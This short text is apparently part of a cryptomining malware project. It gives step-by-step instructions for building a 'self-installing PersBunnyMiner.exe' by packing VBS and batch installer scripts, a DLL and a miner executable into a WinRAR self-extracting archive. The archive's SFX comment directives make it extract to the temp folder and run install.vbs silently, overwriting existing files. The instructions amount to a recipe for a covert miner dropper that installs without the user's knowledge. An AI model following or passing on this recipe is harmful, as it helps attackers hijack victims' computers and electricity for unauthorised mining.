########################################################Creating the self-installing PersBunnyMiner.exe################################################


Select the following:

1. install.vbs
2. setup.bat
3. start.vbs
4. start.bat
5. msvcr120.dll
6. The miner exe

use WinRAR to create a new archive
with them. Use the following options:

Select Compression Method = best
Select Create SFX archvive

Now go to tab “Comment” and paste the following lines:


Path=%temp%
SavePath
Setup="%temp%\install.vbs"
Silent=1
Overwrite=1
